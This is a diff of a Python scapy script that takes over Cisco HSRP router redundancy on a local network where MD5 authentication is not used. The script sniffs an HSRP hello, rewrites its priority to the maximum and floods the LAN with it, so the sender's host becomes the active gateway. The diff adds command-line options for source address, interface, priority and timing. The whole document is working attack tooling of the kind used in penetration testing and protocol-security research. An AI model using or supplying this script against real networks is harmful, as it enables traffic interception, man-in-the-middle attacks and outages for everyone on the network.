@@ -1,10 +1,10 @@
 #!/usr/bin/env python
 
-# $Id: 20121215$
-# $Date: 2012-12-15 17:22:16$
+# $Id: 20121216$
+# $Date: 2012-12-16 22:46:59$
 # $Author: Marek Lukaszuk$
 
-# This takes over any HSRPv0/1 and v2
+# This takes over any HSRPv1 and v2
 # communication in LAN that
 # is _not_ protected by MD5 auth
 
@@ -15,18 +15,26 @@ from scapy.all import *
 import time
 import sys
 import hashlib
-from Crypto.Hash import HMAC
+import argparse
+
+parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
+parser.add_argument('-s','--source',help='source IP address, either IPv4 or IPv6, if not set uses the corresponding interface address')
+parser.add_argument('-i','--iface',default="tap0",help='interface to listen on and send packets (default tap0)')
+parser.add_argument('-p','--priority',default=255,help='priority (default 255)', type=int)
+parser.add_argument('-t','--hellotime',default=1,help='hello time (default 1s)', type=int)
+parser.add_argument('-v','--verbose',action="store_true",help='enables scapy verbose output')
+
+(arg,rest_argv) = parser.parse_known_args(sys.argv)
 
 # tweak variables
-IPv4Src = "10.0.0.10"
-IPv6Src = "2001::ff"
-EthSrc = "00:aa:bb:cc:dd:ee"
-interface = "tap2"
-HSRPpri = 255
-HSRPHelloTime = 1
+IPv4Src = arg.source
+IPv6Src = arg.source
+interface = arg.iface
+HSRPpri = arg.priority
+HSRPHelloTime = arg.hellotime
 
 # scapy verbose toggle
-conf.verb = 0
+conf.verb = arg.verbose
 
 # Cisco Hot Standby Router Protocol
 #    Group State TLV: Type=1 Len=40
@@ -69,7 +77,7 @@ p = sniff(iface = interface, count = 1, filter = "udp and port 1985", lfilter = 
 print "[+] got one packet"
 
 # now lets modify it
-p[Ether].src = EthSrc
+p[Ether].src = None
 
 # set some values to None to
 # recalculate them automatically
@@ -87,14 +95,13 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
   data = str(p[HSRP])
   # print data.encode('hex')
 
-  org = data[:]
   off = 0
   while True:
 
     if off >= len(data):
       break
 
-    if data[off] == "\x01": # HSRPv2 TLV for group TODO
+    if data[off] == "\x01": # HSRPv2 TLV for group
       data = data[:off+16]+chr(HSRPpri)+data[off+17:]
 
     if data[off] == "\x04":
@@ -106,18 +113,18 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
   # print data.encode('hex')
   p[UDP].payload = data.decode('string_escape')
 else:
-  if len(p[HSRP]) > 28: # HSRPv0/1 Auth - TODO
+  if len(p[HSRP]) > 28: # HSRPv0/1 Auth
     print "[-] auth HSRP using MD5, stopping"
     sys.exit(1)
 
-  p[HSRP].priority = chr(HSRPpri)
+  p[HSRP].priority = HSRPpri
 
 print "[+] packet modified, sending"
 
 # and lets flood the LAN
 while True:
-  sendp(p,iface = interface)
+  sendp(p, iface = interface)
   sys.stdout.write(".")
   sys.stdout.flush()
-  time.sleep(HSRPHelloTime) # this could be tweaked
+  time.sleep(HSRPHelloTime)
 
